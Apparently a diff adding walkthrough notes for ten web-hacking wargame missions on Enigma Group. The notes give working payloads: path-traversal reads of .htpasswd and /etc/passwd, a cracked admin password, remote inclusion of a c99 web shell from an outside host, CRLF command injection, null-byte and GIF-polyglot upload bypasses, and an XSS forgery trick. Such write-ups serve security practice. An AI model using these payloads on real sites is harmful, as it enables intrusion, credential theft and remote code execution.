@@ -1,0 +1,44 @@
+1 LFI – Local File Inclusion
+	Notice the error saying (pages/$page): is not found, that tells you there is LFI exploit, we enter the /pages/ to see the dir contents, in one of the text files you see a link to the admin page – of course we want to look in it,, uh oh we got .htaccess authentication ok now that means there is a .htpassword somewhere – yea right its in /admin/ obviously lets put this ?page=../admin/.htpasswd in the url and reveal this file: admin:dXWxIS6i6irN6
+	Then crack the hash with JTR – the password is: dog
+
+2 Redirection Evasion
+This is easy, it’s a meta redirect tag- you need to quickly hit esc key to prevent the redirection to the next page. View the source to reveal <!-- 911_411.php --> then access the file directly.
+
+3 RFI – Remote File Inclusion
+	Another easy one, think of what RFI means… remote! Yea include any file you create on your server or wherever, then include that to execute it!  Example link to beat this mission:
+index.php?page=http://c99.gen.tr/c99-rar.html note that c99 is a shell file.
+
+4 Basic Filter Evasion
+	We know this is a filter thing, when you attempt to inject the famous ../../etc/passwd string and you will get filtered out with the “../” so we add more chars to it becoming “ ….//” to bypass the filter. Now we inject this string: index.php?page=....//....//....//etc/passwd and we get a message saying that you are not allowed to access that file but otherwise check the history – ah..  .bash_history  let’s find that file. 
+
+	-incomplete-
+
+5 XSS forgery
+	okay here, we see that there is a shout box and a edit profile. The only thing you can view the user is their avatar. And you can edit the location of where the avatar is located. Oooh!! Let’s inject the avatar with the shoutbox link – but wait.. when you hit submit in the shoutbox, it flickers and redirects to a different page!  Let’s catch that redirection and it was http://www.enigmagroup.org/missions/basics/vm/5/index.php?message=&submit=Post now, post that link in your avatar and update it to beat it!  Major XSS for most sites!		
+
+6 Carriage Return Line Feed Injection
+	message says that only folder /test/ exists but when you enter test, it reveals directory listing of two files, notice there is a file called config.php and you want to view it. Think about unix commands and inject that in the field.
+	test%0d%0acat test/config.php will enable the command to view the contents of config.php using the %0d%0a hack!
+
+7 Null Byte Upload
+	the null byte character is %00 and we use that to trick the script into thinking that there is a null character on the ending of the .jpg string to allow the php file to be uploaded.
+	Rename your php file to hack.php%00.jpg and upload it.
+
+8 Null Byte Includes
+	Since this is similar to LFI but we want to access ../../../etc/passwd but it doesn’t allow me because it keeps adding the .php in the end –ah!!—use the null byte %00 in the end to omit that .php out of that ../../../etc/passwd(.php) by adding the %00 in the end : 
+?page=../../../etc/passwd%00
+
+9 GIF Upload bypass 1 ( gif to php )
+The code checks for file format of gif images. We create a gif image then add php code in it, rename it to image.php%00.gif then upload it.  Have Tamperdata enabled when uploading so you can tamper the header by changing the filename image.php%00.gif into image.php leaving everything else. This will bypass the filter thinking it is gif image then lets it gets uploaded as php file. Be sure the gif file has the correct header as GIF98a(yourimagefilenameherewithoutextension) in this case. GIF98aimage
+
+
+10 GIF Upload bypass 2 ( php to gif)
+create a php file with <? phpinfo(); ?> save as php file, then create a white gif image, save as image.gif (can be done in photoshop or whatever)
+	then write python script:
+#!/usr/bin/env python
+lavender = open ('image.gif','rb').read()
+lavender += open ('phpinfo.php','rb').read()
+open ('image.php','wb').write(lavender)
+
+upload that image.php to beat this mission!
